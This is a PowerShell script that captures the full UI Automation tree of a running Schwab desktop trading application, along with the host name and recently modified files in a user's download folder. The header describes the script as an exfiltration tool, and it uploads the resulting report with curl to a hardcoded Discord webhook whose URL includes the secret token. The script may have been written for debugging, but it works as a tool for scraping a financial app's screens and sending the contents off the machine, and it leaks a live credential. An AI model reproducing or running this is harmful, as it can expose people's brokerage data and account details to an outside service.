# uia2.ps1 -- dump EVERY top-level SDD window's UIA tree (to capture the dialog).
# Read-only. Exfils to Discord webhook.
$ErrorActionPreference = 'Continue'
$WH = 'https://discord.com/api/webhooks/1495923230614229024/Uf2BDYaB9-WlIHWGzilU3Tb4pvi0JlVN0ZW1kqbUjAkMZV79fCHQoVlBZpZgvmlltWtE'
$DLDIR = 'C:\Users\Jas\Desktop\temp'

Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
$out = @()

function Push-Tree {
    $rep = Join-Path $env:TEMP 'sdd-dialog-tree.txt'
    ($out -join "`r`n") | Set-Content -LiteralPath $rep -Encoding UTF8
    $sz = (Get-Item -LiteralPath $rep).Length
    & curl.exe -s -o NUL -w ("EXFIL bytes=$sz http=%{http_code}`n") -A 'DiscordBot (clawcode,1.0)' -F ("file=@$rep") $WH | Write-Host
}

function Walk-Tree {
    param([System.Windows.Automation.AutomationElement]$Element, [int]$Depth = 0, [int]$MaxDepth = 14)
    if ($null -eq $Element -or $Depth -gt $MaxDepth) { return }
    $indent = '  ' * $Depth
    try {
        $name = $Element.Current.Name
        $id   = $Element.Current.AutomationId
        $ct   = $Element.Current.ControlType.ProgrammaticName -replace 'ControlType\.', ''
        $cls  = $Element.Current.ClassName
        $en   = $Element.Current.IsEnabled
        try { $bb = $Element.Current.BoundingRectangle } catch { $bb = $null }
    } catch { $script:out += "$indent[error: $_]"; return }
    $nameStr = ''; if ($name) { $nameStr = " `"$name`"" }
    $idStr = '';   if ($id)   { $idStr   = " id=$id" }
    $clsStr = '';  if ($cls)  { $clsStr  = " class=$cls" }
    $enStr = ''; if (-not $en) { $enStr = ' [disabled]' }
    $rectStr = ''
    if ($bb -and -not [double]::IsInfinity($bb.X)) {
        $rectStr = ' rect=' + [int]$bb.X + ',' + [int]$bb.Y + ',' + [int]$bb.Width + 'x' + [int]$bb.Height
    }
    $script:out += "$indent$ct$nameStr$idStr$clsStr$enStr$rectStr"
    try {
        $walker = [System.Windows.Automation.TreeWalker]::ControlViewWalker
        $child = $walker.GetFirstChild($Element)
        while ($null -ne $child) {
            Walk-Tree -Element $child -Depth ($Depth + 1) -MaxDepth $MaxDepth
            $child = $walker.GetNextSibling($child)
        }
    } catch { $script:out += "$indent  [walk error: $_]" }
}

$out += "===== SDD Dialog Inspection ====="
$out += "Host: $env:COMPUTERNAME  Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz')"
$out += ""

$proc = Get-Process -Name 'Schwab.SI.SI2Desktop.Container' -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) { $out += "ERROR: SDD not running."; Push-Tree; return }
$out += "SDD pid=$($proc.Id) mainWindow=$($proc.MainWindowHandle)"

# download folder state
$cnt = 0
if (Test-Path -LiteralPath $DLDIR) { $cnt = (Get-ChildItem -LiteralPath $DLDIR -Recurse -File -Force).Count }
$out += "download.dir=$DLDIR file.count.now=$cnt"
$recent = @()
if (Test-Path -LiteralPath $DLDIR) {
    $recent = Get-ChildItem -LiteralPath $DLDIR -Recurse -File -Force | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-30) } | Sort-Object LastWriteTime -Descending
}
$out += "files modified in last 30 min: $($recent.Count)"
foreach ($f in ($recent | Select-Object -First 20)) { $out += ("  " + $f.FullName + "  [" + $f.Length + "b  " + $f.LastWriteTime.ToString('o') + "]") }
$out += ""

# walk EVERY top-level window of the SDD process
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ProcessIdProperty, $proc.Id)
$wins = [System.Windows.Automation.AutomationElement]::RootElement.FindAll([System.Windows.Automation.TreeScope]::Children, $cond)
$out += "SDD top-level UIA windows: $($wins.Count)"
$out += ""
for ($i = 0; $i -lt $wins.Count; $i++) {
    $w = $wins[$i]
    try { $wn = $w.Current.Name; $wc = $w.Current.ClassName; $wh = $w.Current.NativeWindowHandle } catch { $wn=''; $wc=''; $wh=0 }
    $out += "=== Top-level window $($i+1)/$($wins.Count): `"$wn`" class=$wc hwnd=$wh ==="
    Walk-Tree -Element $w -Depth 0
    $out += ""
}
$out += "===== End ====="
Push-Tree
Write-Host "done"
